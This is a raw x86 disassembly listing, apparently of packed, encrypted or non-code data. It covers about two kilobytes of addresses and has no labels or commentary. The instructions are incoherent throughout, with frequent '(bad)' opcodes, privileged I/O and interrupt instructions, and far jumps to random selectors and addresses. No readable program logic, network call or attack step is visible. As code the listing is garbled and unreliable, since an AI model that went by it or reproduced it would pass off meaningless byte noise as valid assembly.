  407a86:	shl    BYTE PTR [esi+0x41003278],0x77
  407a8d:	xlat   BYTE PTR ds:[ebx]
  407a8e:	adc    ah,BYTE PTR [edx-0x64]
  407a91:	lea    esi,[eax+0x69]
  407a94:	dec    eax
  407a95:	mov    ebx,0x48fdcb9
  407a9a:	sub    cl,BYTE PTR [ebx+0x6d2354b0]
  407aa0:	mov    al,ds:0x90fb717
  407aa5:	mov    DWORD PTR [edi+0x4032160c],ebp
  407aab:	std    
  407aac:	inc    DWORD PTR [ebp-0x36]
  407aaf:	test   DWORD PTR ds:0xc523d1e9,ecx
  407ab5:	inc    eax
  407ab6:	add    ebx,ecx
  407ab8:	push   ds
  407ab9:	jg     0x407ab6
  407abb:	stos   DWORD PTR es:[edi],eax
  407abc:	or     eax,0x402162fd
  407ac1:	jne    0x407a94
  407ac3:	xchg   ecx,eax
  407ac4:	add    eax,0x6e394dc6
  407ac9:	lahf   
  407aca:	cmp    bl,dl
  407acc:	xchg   esi,eax
  407acd:	or     al,0x61
  407acf:	int3   
  407ad0:	jg     0x407aad
  407ad2:	scas   eax,DWORD PTR es:[edi]
  407ad3:	mov    eax,0x81125e1
  407ad8:	clc    
  407ad9:	jp     0x407a82
  407adb:	pop    eax
  407adc:	and    al,0x32
  407ade:	jmp    0x2a73:0x146f5d5c
  407ae5:	fdiv   DWORD PTR ds:0xaa303c6d
  407aeb:	ja     0x407af1
  407aed:	push   ss
  407aee:	jp     0x407b13
  407af0:	pusha  
  407af1:	jmp    0x407a80
  407af3:	hlt    
  407af4:	mov    ah,0x7b
  407af6:	pop    edi
  407af7:	xchg   ecx,eax
  407af8:	pop    eax
  407af9:	pop    edi
  407afa:	add    ecx,esp
  407afc:	iretw  
  407afe:	jmp    0x73f5:0x11d7cfcf
  407b05:	mov    DWORD PTR [esi-0x77],edx
  407b08:	adc    al,0x31
  407b0a:	mul    BYTE PTR [eax]
  407b0c:	mov    dl,0xd9
  407b0f:	jmp    0xe6972744
  407b14:	bound  edx,QWORD PTR [ebx-0x56ae7bb8]
  407b1a:	pop    eax
  407b1b:	(bad)  
  407b1c:	adc    BYTE PTR [ecx+esi*4+0x3888376],ah
  407b23:	cmp    DWORD PTR [esi-0x42ed0d44],edi
  407b29:	add    DWORD PTR [edx+0x69],esi
  407b2c:	sahf   
  407b2d:	repz mov eax,ds:0x8d92382a
  407b33:	fstp   DWORD PTR [eax-0x2922a32f]
  407b39:	add    ah,BYTE PTR [ecx+eiz*4-0x3438bdaf]
  407b40:	gs mov bh,0x23
  407b43:	sbb    ecx,DWORD PTR cs:[ecx+0x5b]
  407b47:	sub    esi,esp
  407b49:	pushf  
  407b4a:	jnp    0x407ae3
  407b4c:	add    DWORD PTR [esi+0x151ffda5],ebp
  407b52:	out    dx,eax
  407b53:	xor    bh,0xff
  407b56:	inc    ebp
  407b57:	mov    esi,0x424c473f
  407b5c:	push   es
  407b5d:	xchg   ebp,eax
  407b5e:	iret   
  407b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b60:	xor    al,0x13
  407b62:	pop    es
  407b63:	out    dx,eax
  407b64:	popa   
  407b65:	or     esp,esi
  407b67:	fimul  WORD PTR [ebp-0x47]
  407b6a:	sbb    DWORD PTR [ecx],eax
  407b6c:	cmc    
  407b6d:	rcr    DWORD PTR [edi+eiz*1],0xbb
  407b71:	push   cs
  407b72:	cld    
  407b73:	lods   eax,DWORD PTR ds:[esi]
  407b74:	repnz fwait
  407b76:	ror    DWORD PTR [esi],1
  407b78:	xor    DWORD PTR [edi],esp
  407b7a:	fwait
  407b7b:	sub    eax,0x7dd02935
  407b80:	adc    bh,BYTE PTR [eax]
  407b82:	pusha  
  407b83:	pop    esi
  407b84:	out    0x94,al
  407b86:	jmp    0xeae:0xe8eb1663
  407b8d:	jg     0x407b91
  407b8f:	and    BYTE PTR [eax],dh
  407b91:	mov    dl,0x93
  407b93:	jno    0x407b44
  407b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b96:	pop    esi
  407b97:	jecxz  0x407b28
  407b99:	ret    0xe411
  407b9c:	sub    ah,BYTE PTR [edi]
  407b9e:	adc    eax,0xcc7daa85
  407ba3:	push   edx
  407ba4:	mov    esp,0x116de171
  407ba9:	add    al,0x4e
  407bab:	cli    
  407bac:	(bad)  
  407bad:	das    
  407bae:	outs   dx,BYTE PTR ds:[esi]
  407baf:	dec    esp
  407bb0:	xchg   ebp,eax
  407bb1:	imul   ebx,DWORD PTR ds:0x15e732c0,0xffffffb3
  407bb8:	add    ebp,ebp
  407bba:	or     BYTE PTR [edx+0x5273ec3],dl
  407bc0:	pop    es
  407bc1:	sbb    al,0xe9
  407bc3:	xchg   ecx,eax
  407bc4:	or     BYTE PTR [ebp-0x40262358],dl
  407bca:	ja     0x407c2a
  407bcc:	iret   
  407bcd:	(bad)  
  407bce:	sbb    ecx,esi
  407bd0:	fild   DWORD PTR [edi-0x1c3d3bc7]
  407bd6:	sahf   
  407bd7:	xchg   edi,eax
  407bd8:	pop    ds
  407bd9:	mov    ds:0xc5e10c1a,eax
  407bde:	mov    esi,0x694828fd
  407be3:	cmp    eax,eax
  407be5:	enter  0x73fc,0x27
  407be9:	push   ebx
  407bea:	jbe    0x407ba6
  407bec:	loopne 0x407c1c
  407bee:	add    bl,dh
  407bf0:	into   
  407bf1:	mov    bh,0x4a
  407bf3:	pop    eax
  407bf4:	mov    dh,0x6b
  407bf6:	sub    eax,eax
  407bf8:	rcr    DWORD PTR [edi-0x317759e8],cl
  407bfe:	pusha  
  407bff:	xor    ecx,DWORD PTR [edi-0x13]
  407c02:	xchg   DWORD PTR [ebx+0x10],ecx
  407c05:	outs   dx,DWORD PTR ds:[esi]
  407c06:	int3   
  407c07:	pop    ds
  407c08:	repz retf 0xc213
  407c0c:	xchg   edx,eax
  407c0d:	rcr    DWORD PTR [edx+0x57e5c164],0x29
  407c14:	mov    BYTE PTR [edx-0x5fc47d95],al
  407c1a:	mov    BYTE PTR [ebx+0x5d165e72],dh
  407c20:	lds    ebx,FWORD PTR [ebx+0x4ee07049]
  407c26:	and    DWORD PTR [ecx],ebx
  407c28:	dec    ecx
  407c29:	stc    
  407c2a:	push   ebp
  407c2b:	inc    esi
  407c2c:	mov    eax,ds:0x42e2b7
  407c31:	dec    edx
  407c32:	jmp    0x409f81
  407c37:	mov    al,0x4e
  407c39:	cmp    bh,ch
  407c3b:	mov    ds:0xc733738b,al
  407c40:	sbb    BYTE PTR ds:0x8c3f9ce6,cl
  407c46:	push   0x7c7c3a06
  407c4b:	dec    esi
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	cmp    ah,BYTE PTR [ebx]
  407c51:	adc    ecx,ebx
  407c53:	inc    ecx
  407c54:	(bad)  
  407c55:	or     BYTE PTR [ebx+eiz*1+0x62e5a227],bl
  407c5c:	sub    ebx,edx
  407c5e:	jmp    0x407c86
  407c60:	inc    ebp
  407c61:	sub    bl,bl
  407c63:	xchg   esp,eax
  407c64:	sub    BYTE PTR [ebp-0x7b864910],bh
  407c6a:	daa    
  407c6b:	in     eax,dx
  407c6c:	aam    0xab
  407c6e:	mov    ds:0xfac227cd,al
  407c73:	mov    cl,0x8c
  407c75:	pop    edi
  407c76:	xchg   ebx,eax
  407c77:	repnz mov ebx,0xcae71d15
  407c7d:	pop    ebp
  407c7e:	(bad)  
  407c7f:	out    dx,eax
  407c80:	cwde   
  407c81:	test   DWORD PTR [edi],0xab97f94
  407c87:	inc    ebx
  407c88:	emms   
  407c8a:	dec    ecx
  407c8b:	hlt    
  407c8c:	ficom  DWORD PTR [edi]
  407c8e:	cmc    
  407c8f:	lods   al,BYTE PTR ds:[esi]
  407c90:	scas   eax,DWORD PTR es:[edi]
  407c91:	mov    edx,0x471387d1
  407c96:	stos   DWORD PTR es:[edi],eax
  407c97:	scas   eax,DWORD PTR es:[edi]
  407c98:	adc    esp,edx
  407c9a:	add    BYTE PTR [ecx+0x6a],dl
  407c9d:	leave  
  407c9e:	popa   
  407c9f:	ret    
  407ca0:	push   edx
  407ca1:	adc    ecx,0x61
  407ca4:	ret    0xea6b
  407ca7:	jl     0x407ceb
  407ca9:	mov    dh,0xec
  407cab:	cmp    esi,edx
  407cad:	inc    ebp
  407cae:	xchg   DWORD PTR [ebp+0x2adad9e],esp
  407cb4:	out    dx,al
  407cb5:	pusha  
  407cb6:	out    dx,eax
  407cb7:	js     0x407cce
  407cb9:	mov    ecx,0x725ee5f7
  407cbe:	stos   BYTE PTR es:[edi],al
  407cbf:	sbb    DWORD PTR [eax],esp
  407cc1:	mul    DWORD PTR [ebx+0x4a]
  407cc4:	arpl   WORD PTR [edx+0x57b6e8a],bx
  407cca:	scas   eax,DWORD PTR es:[edi]
  407ccb:	leave  
  407ccc:	sub    al,0xad
  407cce:	loope  0x407d14
  407cd0:	lods   al,BYTE PTR ds:[esi]
  407cd1:	mov    ds:0xecd78300,al
  407cd6:	scas   al,BYTE PTR es:[edi]
  407cd7:	test   al,0xfb
  407cd9:	adc    BYTE PTR [ebx],dl
  407cdb:	add    al,0x69
  407cdd:	(bad)  
  407cde:	je     0x407d19
  407ce0:	jnp    0x407d0d
  407ce2:	push   0xb490b57a
  407ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ce8:	sub    dl,bl
  407cea:	daa    
  407ceb:	adc    ecx,DWORD PTR [edx+0x53f1557d]
  407cf1:	jl     0x407c7d
  407cf3:	mov    dh,0xe3
  407cf5:	icebp  
  407cf6:	pushf  
  407cf7:	aam    0x22
  407cf9:	shr    ecx,0x39
  407cfc:	adc    al,0x3d
  407cfe:	test   esp,ecx
  407d00:	dec    ebx
  407d01:	sub    al,0xc8
  407d03:	push   ecx
  407d04:	mov    cl,0x96
  407d06:	es aam 0x27
  407d09:	jns    0x407ce3
  407d0b:	gs jmp esi
  407d0e:	sbb    bl,dh
  407d10:	push   0xd200fe5c
  407d15:	test   BYTE PTR [edx+0x28],bl
  407d18:	or     eax,0x23687cb5
  407d1d:	mov    dl,0x0
  407d1f:	(bad)  
  407d20:	int3   
  407d21:	stc    
  407d22:	or     cl,bh
  407d24:	lahf   
  407d25:	ret    0x2d97
  407d28:	inc    edx
  407d29:	mov    WORD PTR [ecx],gs
  407d2b:	fstp   QWORD PTR [eax]
  407d2d:	mov    cl,0xb8
  407d2f:	sbb    eax,0x310867e6
  407d34:	rcl    bh,0xa2
  407d37:	int    0x7f
  407d39:	xchg   ebx,eax
  407d3a:	dec    edi
  407d3b:	push   esi
  407d3c:	fidiv  DWORD PTR [eax+eax*8]
  407d3f:	and    ah,BYTE PTR [ecx]
  407d41:	sbb    al,0x31
  407d43:	xor    al,0x9
  407d45:	adc    DWORD PTR [esp+edi*4+0x28d20356],edi
  407d4c:	push   eax
  407d4d:	ror    ecx,cl
  407d4f:	mov    WORD PTR [ecx],es
  407d51:	pop    esp
  407d52:	and    al,0x72
  407d54:	popf   
  407d55:	adc    al,bh
  407d57:	fiadd  WORD PTR [esi-0x2e]
  407d5a:	hlt    
  407d5b:	lods   al,BYTE PTR ds:[esi]
  407d5c:	xchg   BYTE PTR [ebx+0x1],ah
  407d5f:	adc    eax,0x10c4bceb
  407d64:	mov    edi,0x78a7f6e
  407d69:	lock xchg esp,eax
  407d6b:	adc    al,0x85
  407d6d:	das    
  407d6e:	cmp    edi,DWORD PTR [eax]
  407d70:	and    DWORD PTR [esp+edi*4],0xffffffb2
  407d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d75:	lds    edx,FWORD PTR [eax-0x42]
  407d78:	lods   eax,DWORD PTR ds:[esi]
  407d79:	add    dh,ah
  407d7b:	push   dx
  407d7d:	mov    WORD PTR [edi-0x59],gs
  407d80:	call   0x5681755
  407d85:	enter  0xc3c0,0x86
  407d89:	pop    edi
  407d8a:	jae    0x407d90
  407d8c:	cmp    DWORD PTR [edx-0x25],ebx
  407d8f:	es push es
  407d91:	in     al,0x27
  407d93:	jp     0x407dca
  407d95:	ret    0x73b3
  407d98:	test   eax,0xd22ec944
  407d9d:	mov    ecx,0x7ca99d3a
  407da2:	xchg   edx,eax
  407da3:	dec    eax
  407da4:	or     ecx,ecx
  407da6:	and    eax,0x4b95bdb4
  407dab:	and    edi,DWORD PTR [edx]
  407dad:	mov    ds:0xc16e481e,al
  407db2:	or     eax,eax
  407db4:	fwait
  407db5:	icebp  
  407db6:	jae    0x407e12
  407db8:	scas   al,BYTE PTR es:[edi]
  407db9:	and    ebp,esi
  407dbb:	sub    dh,0xa8
  407dbe:	and    eax,0x61614c8a
  407dc3:	into   
  407dc4:	mov    di,WORD PTR [ebx]
  407dc7:	imul   ecx,DWORD PTR [edx+ebp*4],0xf6b6fa2f
  407dce:	mov    ecx,0x847b0cae
  407dd3:	stc    
  407dd4:	cli    
  407dd5:	(bad)  
  407dd6:	add    esi,DWORD PTR [edi]
  407dd8:	jge    0x407d6a
  407dda:	pop    ebx
  407ddb:	arpl   WORD PTR [eax],sp
  407ddd:	pop    esi
  407dde:	push   ss
  407ddf:	or     DWORD PTR [eax-0x1d],esi
  407de2:	xor    al,dl
  407de4:	pop    ss
  407de5:	cmp    al,0x4d
  407de7:	mov    DWORD PTR [ecx],esp
  407de9:	and    bl,dh
  407deb:	(bad)  
  407dec:	out    0xf9,al
  407dee:	add    DWORD PTR [edi-0xb],ecx
  407df1:	cdq    
  407df2:	pop    ds
  407df3:	jl     0x407dd9
  407df5:	pop    ecx
  407df6:	outs   dx,BYTE PTR ds:[esi]
  407df7:	adc    al,0x15
  407df9:	cli    
  407dfa:	popf   
  407dfb:	orps   xmm7,xmm7
  407dfe:	stos   DWORD PTR es:[edi],eax
  407dff:	fist   WORD PTR [ebx]
  407e01:	and    BYTE PTR [eax-0x2a],0x5c
  407e05:	cs mov ebp,0xab918821
  407e0b:	push   ebx
  407e0c:	bound  edi,QWORD PTR [ecx+0x1a]
  407e0f:	add    dh,dh
  407e11:	sbb    al,0xf2
  407e13:	popf   
  407e14:	(bad)  
  407e15:	gs sti 
  407e17:	xchg   BYTE PTR [eax-0x42532b29],cl
  407e1d:	and    esp,DWORD PTR [esi+0x14750be]
  407e23:	cld    
  407e24:	push   cs
  407e25:	or     al,0x55
  407e27:	inc    edx
  407e28:	mov    esi,0xc3d6609e
  407e2d:	jne    0x407dfe
  407e2f:	cli    
  407e30:	and    BYTE PTR [ecx-0xa],cl
  407e33:	add    ebx,DWORD PTR [edx-0x40]
  407e36:	jmp    DWORD PTR [esi-0x2c]
  407e39:	sub    esp,DWORD PTR [edx-0x2ad00a5b]
  407e3f:	jae    0x407de4
  407e41:	fcomp  DWORD PTR [ebp+0x5236e5f3]
  407e47:	jne    0x407e3f
  407e49:	pushf  
  407e4a:	pusha  
  407e4b:	stos   DWORD PTR es:[edi],eax
  407e4c:	cmc    
  407e4d:	scas   al,BYTE PTR es:[edi]
  407e4e:	pop    ebp
  407e4f:	pop    eax
  407e50:	mov    eax,0x3074b887
  407e55:	xor    al,0xdd
  407e57:	push   edx
  407e58:	aad    0x3a
  407e5a:	or     edx,ebp
  407e5c:	pusha  
  407e5d:	sbb    BYTE PTR [ebx-0x4e],ch
  407e60:	in     eax,dx
  407e61:	ss int 0x58
  407e64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e65:	fcomp  DWORD PTR [edi+0x358b37a2]
  407e6b:	lods   al,BYTE PTR ds:[esi]
  407e6c:	mov    al,0x28
  407e6e:	fdiv   QWORD PTR [eax-0x6b]
  407e71:	retf   0x13e0
  407e74:	fwait
  407e75:	leave  
  407e76:	adc    DWORD PTR [edi-0xb],ecx
  407e79:	xchg   ebx,eax
  407e7a:	ds push ds
  407e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e7d:	nop
  407e7e:	mov    esp,0xb8b54493
  407e83:	push   0xffffffd7
  407e85:	xor    ecx,DWORD PTR [esi+0x4d]
  407e88:	mov    eax,ds:0x6ee6faad
  407e8d:	push   edi
  407e8e:	je     0x407eb4
  407e90:	mov    ds:0x3a66c80b,al
  407e95:	push   eax
  407e96:	ret    0xcf7b
  407e99:	cmp    al,0xcb
  407e9b:	outs   dx,BYTE PTR ds:[esi]
  407e9c:	adc    BYTE PTR [ebx+0x5d],al
  407e9f:	shl    DWORD PTR [esi],0xdd
  407ea2:	sub    BYTE PTR [edx],al
  407ea4:	ins    DWORD PTR es:[edi],dx
  407ea5:	sbb    ebx,esp
  407ea7:	jmp    0x407e69
  407ea9:	or     cl,0x7b
  407eac:	imul   esi,DWORD PTR [edi],0x2e3d7c65
  407eb2:	xchg   ebp,eax
  407eb3:	xchg   cl,dl
  407eb5:	inc    ebp
  407eb6:	test   DWORD PTR [edx-0x38d58039],edx
  407ebc:	inc    ebp
  407ebd:	fs (bad) 
  407ebf:	cmc    
  407ec0:	sbb    bh,BYTE PTR [edx-0x7a90597]
  407ec6:	jg     0x407f30
  407ec8:	out    0xfe,al
  407eca:	adc    DWORD PTR [ebx+0x47],eax
  407ecd:	add    edx,DWORD PTR [esi]
  407ecf:	ss not esp
  407ed2:	sti    
  407ed3:	out    dx,eax
  407ed4:	pop    edi
  407ed5:	push   cs
  407ed6:	adc    eax,0x459a9840
  407edb:	push   ss
  407edc:	jle    0x407eb4
  407ede:	and    ebp,DWORD PTR [ebp-0x30]
  407ee1:	adc    ebx,ebp
  407ee3:	jmp    0xe723:0xa3ce8b2f
  407eea:	adc    al,0x45
  407eec:	and    ecx,DWORD PTR [edx]
  407eee:	xor    DWORD PTR [ecx+0x35],eax
  407ef1:	cmp    al,0x65
  407ef4:	jo     0x407efb
  407ef6:	mov    ecx,0xb855a31a
  407efb:	cmp    al,0x47
  407efd:	cmp    eax,0x50e2c768
  407f02:	rcl    BYTE PTR [ebx],0x46
  407f05:	push   esi
  407f06:	outs   dx,BYTE PTR ds:[esi]
  407f07:	jmp    0x407f0c
  407f09:	gs or  eax,0xe1d5568
  407f0f:	inc    esp
  407f10:	lods   al,BYTE PTR ds:[esi]
  407f11:	inc    esp
  407f12:	pop    es
  407f13:	mov    eax,0xd48cc93c
  407f18:	mov    ch,0x7e
  407f1a:	or     DWORD PTR [edx],esi
  407f1c:	push   ebp
  407f1d:	mov    ebx,DWORD PTR [edx]
  407f1f:	mov    cl,0x76
  407f21:	or     ebx,DWORD PTR [ecx]
  407f23:	imul   si,si,0x88d4
  407f28:	repnz fiadd WORD PTR [eax+edi*2+0x5fb5dfbd]
  407f30:	xchg   BYTE PTR [eax+0x64796ff1],ch
  407f36:	gs scas ax,WORD PTR es:[edi]
  407f39:	add    ebp,DWORD PTR [edx+0x43ee47de]
  407f3f:	hlt    
  407f40:	fs jp  0x407f90
  407f43:	imul   ebp,ebp,0x44
  407f46:	jp     0x407ef2
  407f48:	test   al,0xa2
  407f4a:	inc    edi
  407f4b:	mov    BYTE PTR [ebx],0x4
  407f4e:	pop    ebx
  407f4f:	jmp    0xebac3c6f
  407f54:	scas   eax,DWORD PTR es:[edi]
  407f55:	mov    eax,0xc8493a8
  407f5a:	iret   
  407f5b:	(bad)  
  407f5c:	pusha  
  407f5d:	mov    edi,0xfc4758a8
  407f62:	mov    esi,0x92fe0a9f
  407f67:	mov    al,es:0x5104e08b
  407f6d:	mov    eax,0xd70628c2
  407f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f73:	mov    bh,0x2c
  407f75:	out    0x9e,eax
  407f77:	ins    BYTE PTR es:[edi],dx
  407f78:	mov    bh,0x91
  407f7a:	(bad)  
  407f7b:	jnp    0x407f1e
  407f7d:	jo     0x407f7f
  407f7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f80:	in     eax,dx
  407f81:	sahf   
  407f82:	imul   esp,DWORD PTR [edx],0x6e7c4740
  407f88:	fadd   DWORD PTR [ecx-0x706c6739]
  407f8e:	push   eax
  407f8f:	cmp    BYTE PTR [eax],bl
  407f91:	stos   BYTE PTR es:[edi],al
  407f92:	test   eax,0x6462bf73
  407f97:	scas   eax,DWORD PTR es:[edi]
  407f98:	jg     0x407f9f
  407f9a:	test   DWORD PTR [ecx],0x8bc07475
  407fa0:	lock pop ebp
  407fa2:	lods   eax,DWORD PTR ds:[esi]
  407fa3:	sub    esp,DWORD PTR [edx+0x74588b75]
  407fa9:	pop    ds
  407faa:	div    ah
  407fac:	push   es
  407fad:	pop    es
  407fae:	inc    esp
  407faf:	cmp    al,0x5
  407fb1:	fld    QWORD PTR [ecx+eax*1+0x55dbc842]
  407fb8:	inc    eax
  407fb9:	adc    al,0xac
  407fbb:	ret    
  407fbc:	bound  eax,QWORD PTR [esi]
  407fbe:	mov    DWORD PTR [ecx+0x64],ebx
  407fc1:	loop   0x408014
  407fc3:	test   eax,0x6ac8f751
  407fc8:	dec    eax
  407fc9:	xor    eax,DWORD PTR [ebp+0x7cdad43f]
  407fcf:	pop    edi
  407fd0:	adc    al,0xff
  407fd2:	push   dx
  407fd4:	inc    ebp
  407fd5:	push   edi
  407fd6:	jl     0x407f8c
  407fd8:	repz int 0x9f
  407fdb:	rcr    cl,cl
  407fdd:	xlat   BYTE PTR ds:[ebx]
  407fde:	or     al,BYTE PTR [ecx-0x220b4c63]
  407fe4:	mov    BYTE PTR [ecx+0x11213193],cl
  407fea:	mov    DWORD PTR [esi],esp
  407fec:	gs retw 0x1203
  407ff1:	and    BYTE PTR [ebx],al
  407ff3:	xor    BYTE PTR [ecx-0x6797252e],dh
  407ff9:	outs   dx,BYTE PTR ds:[esi]
  407ffa:	sahf   
  407ffb:	dec    ecx
  407ffc:	cmp    BYTE PTR [esi+0x5d],dh
  407fff:	cmp    bh,dl
  408001:	jnp    0x408004
  408003:	inc    eax
  408004:	inc    ecx
  408005:	jecxz  0x407fc0
  408007:	pusha  
  408008:	shl    al,cl
  40800a:	xor    DWORD PTR [ecx+0x76],ebp
  40800d:	xchg   ebp,eax
  40800e:	out    0x89,eax
  408010:	sbb    BYTE PTR [esi-0xb983b78],0x83
  408017:	ror    ch,0xd1
  40801a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40801b:	pushf  
  40801c:	fcom   st(0)
  40801e:	pop    ebp
  40801f:	dec    ebp
  408020:	imul   ebp,DWORD PTR [ebp+edx*1-0x21],0xe45c7ab3
  408028:	inc    edx
  408029:	and    DWORD PTR [ecx-0x8],ecx
  40802c:	lock hlt 
  40802e:	(bad)  
  40802f:	lahf   
  408030:	sbb    al,0xcd
  408032:	xor    eax,0xa88a9f4a
  408037:	(bad)  
  408039:	call   0xfffb:0x60b10811
  408040:	(bad)  
  408041:	pop    ds
  408042:	and    BYTE PTR [ebp-0x6eba5ee8],ah
  408048:	in     al,0x2d
  40804a:	add    ch,bl
  40804c:	cmp    eax,0x23d7a814
  408051:	sti    
  408052:	pop    edx
  408053:	cmp    eax,0xe46282a1
  408058:	add    al,0xdd
  40805a:	pop    eax
  40805b:	xchg   edx,eax
  40805c:	fistp  WORD PTR ds:0x2291e854
  408062:	(bad)  
  408063:	lahf   
  408064:	jmp    0xb4ae:0x38cd697d
  40806b:	add    al,0xe2
  40806d:	xchg   edx,eax
  40806e:	xchg   esp,eax
  40806f:	cmp    esp,DWORD PTR [ebx]
  408071:	pop    edi
  408072:	enter  0x6649,0xde
  408076:	(bad)  
  408077:	imul   ebp,DWORD PTR [eax+0x514a8d0e],0x86566177
  408081:	clflush BYTE PTR [ebx]
  408084:	and    eax,0x307462e6
  408089:	sbb    DWORD PTR [ecx+0x29],ecx
  40808c:	and    eax,0xde051045
  408091:	ror    ecx,1
  408093:	retf   
  408094:	(bad)  
  408095:	sub    dh,al
  408097:	or     eax,ebx
  408099:	les    ebp,FWORD PTR [edx]
  40809b:	xchg   ecx,eax
  40809c:	fadd   QWORD PTR [esi+0x5d6195c1]
  4080a2:	jnp    0x40804c
  4080a4:	test   cl,dh
  4080a6:	dec    esi
  4080a7:	lods   eax,DWORD PTR ds:[esi]
  4080a8:	mov    DWORD PTR [edi+eax*1],ebp
  4080ab:	adc    esp,ebx
  4080ad:	ja     0x4080a2
  4080af:	sub    eax,0xd34e384f
  4080b4:	shl    DWORD PTR [ebx],cl
  4080b6:	add    DWORD PTR [edx-0x7b],esp
  4080b9:	stos   DWORD PTR es:[edi],eax
  4080ba:	xor    DWORD PTR [esi-0x3127b640],eax
  4080c0:	jmp    0x408048
  4080c2:	pop    ebp
  4080c3:	mov    ah,0x60
  4080c5:	test   ebx,esi
  4080c7:	pop    edx
  4080c8:	fnsave [ecx-0x3d]
  4080cb:	mov    bl,ch
  4080cd:	cmp    eax,0x28e95882
  4080d2:	fidiv  WORD PTR [eax+0x1eb43538]
  4080d8:	push   cs
  4080d9:	cmp    bl,bh
  4080db:	mov    DWORD PTR [ebx+0x2d],ecx
  4080de:	xchg   esp,eax
  4080df:	pop    esi
  4080e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080e1:	fimul  DWORD PTR [ecx+0x36]
  4080e4:	inc    ecx
  4080e5:	sub    bl,bl
  4080e7:	les    eax,FWORD PTR [ecx-0x10a97eab]
  4080ed:	cmp    BYTE PTR [esi-0x74fbd40b],dh
  4080f3:	jb     0x408113
  4080f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080f6:	add    DWORD PTR [edi+ebp*2+0x44],edi
  4080fa:	jne    0x40815c
  4080fc:	sti    
  4080fd:	test   al,0x24
  4080ff:	push   0x25
  408101:	xchg   ebx,eax
  408102:	inc    edi
  408103:	mov    BYTE PTR [ebp+0x30],ah
  408106:	dec    ecx
  408107:	push   ds
  408108:	xor    al,0xfe
  40810a:	loopne 0x4080e0
  40810c:	leave  
  40810d:	mov    al,ds:0xdc845df1
  408112:	mov    cl,0x87
  408114:	and    eax,0x6fbb8993
  408119:	stos   BYTE PTR es:[edi],al
  40811a:	jnp    0x408125
  40811c:	gs mov bl,0xa3
  40811f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408120:	add    eax,0x9be87e56
  408125:	or     ebp,ecx
  408127:	and    esi,DWORD PTR [eax]
  408129:	mov    dh,0xe5
  40812b:	push   0xffffff87
  40812d:	mov    ebx,DWORD PTR [ecx-0x6ceb72b1]
  408133:	leave  
  408134:	xchg   ebx,eax
  408135:	inc    ecx
  408136:	jnp    0x408175
  408138:	ror    ch,0x5e
  40813b:	mov    dl,0x9c
  40813d:	add    eax,0x7dcf7dad
  408142:	xor    eax,0xa5e46ab2
  408148:	ds add al,0xc5
  40814b:	pop    ebp
  40814c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40814d:	das    
  40814e:	shl    BYTE PTR [ebx],0xd
  408151:	lods   eax,DWORD PTR ds:[esi]
  408152:	pusha  
  408153:	in     eax,0x9a
  408155:	adc    DWORD PTR [ebp-0x1d],ecx
  408158:	adc    eax,DWORD PTR [edx+0x37]
  40815b:	push   esp
  40815c:	aaa    
  40815d:	jl     0x408156
  40815f:	shr    DWORD PTR [eax-0x5dc40ff6],0xa0
  408166:	and    edi,DWORD PTR [ecx+eax*8]
  408169:	dec    esi
  40816a:	mov    bh,0x2
  40816c:	push   es
  40816d:	adc    BYTE PTR [ebx-0x1fcb01bf],bh
  408173:	retf   
  408174:	inc    esp
  408175:	test   esi,ebp
  408177:	sub    eax,0xf2554134
  40817c:	imul   edi,eax,0xff73e6d3
  408182:	jbe    0x408186
  408184:	loop   0x408120
  408186:	cmp    ah,al
  408188:	outs   dx,DWORD PTR ds:[esi]
  408189:	sub    edx,ecx
  40818b:	xor    DWORD PTR [ecx+0x11],0xfffffff0
  40818f:	pop    edi
  408190:	gs test al,0xbe
  408193:	lods   eax,DWORD PTR ds:[esi]
  408194:	xor    bh,BYTE PTR [edi+0x13]
  408197:	scas   eax,DWORD PTR es:[edi]
  408198:	adc    ebp,edi
  40819a:	fisub  DWORD PTR [edi-0x7db539d5]
  4081a0:	lods   al,BYTE PTR ds:[esi]
  4081a1:	fwait
  4081a2:	jl     0x408155
  4081a4:	and    eax,0x2783cb8f
  4081a9:	loope  0x4081db
  4081ab:	adc    eax,0x3b56154c
  4081b0:	pop    esp
  4081b1:	enter  0xc119,0x88
  4081b5:	clc    
  4081b6:	sahf   
  4081b7:	fisubr DWORD PTR [edx+0x3ade27df]
  4081bd:	pushf  
  4081be:	in     al,dx
  4081bf:	mov    ch,0x45
  4081c1:	sub    BYTE PTR [ebx+0x18bd6592],dl
  4081c7:	add    edx,esi
  4081c9:	and    eax,0xb73fc7
  4081ce:	jg     0x4081ab
  4081d0:	sub    DWORD PTR [edx+0x479593bc],0xfd39c587
  4081da:	inc    edx
  4081db:	ffree  st(0)
  4081dd:	not    bl
  4081df:	push   ebp
  4081e0:	push   cs
  4081e1:	(bad)  
  4081e2:	pop    ss
  4081e3:	imul   esp,DWORD PTR [edx+eax*4],0xe99921ad
  4081ea:	mov    edi,0xcc5d8d6e
  4081ef:	xor    esp,DWORD PTR [eax-0x24]
  4081f2:	jmp    0x853114e4
  4081f7:	arpl   di,si
  4081f9:	repnz mov ds:0x542f5b69,al
  4081ff:	jg     0x408266
  408201:	adc    DWORD PTR [esi+eiz*8+0x31],0x5fdc959f
  408209:	jl     0x4081b7
  40820b:	shl    BYTE PTR [ebp+0x468d4000],0xf
  408212:	scas   al,BYTE PTR es:[edi]
  408213:	jno    0x408262
  408215:	xchg   ecx,eax
  408216:	addr16 leave 
  408218:	mov    al,ds:0xbaacce12
  40821d:	js     0x408282
  40821f:	das    
  408220:	xchg   edi,eax
  408221:	sub    al,0xa
  408223:	test   ch,dl
  408225:	jmp    0x40820f
  408227:	cmc    
  408228:	xor    al,0xa0
  40822a:	(bad)  
  40822c:	or     esp,esp
  40822e:	pop    edi
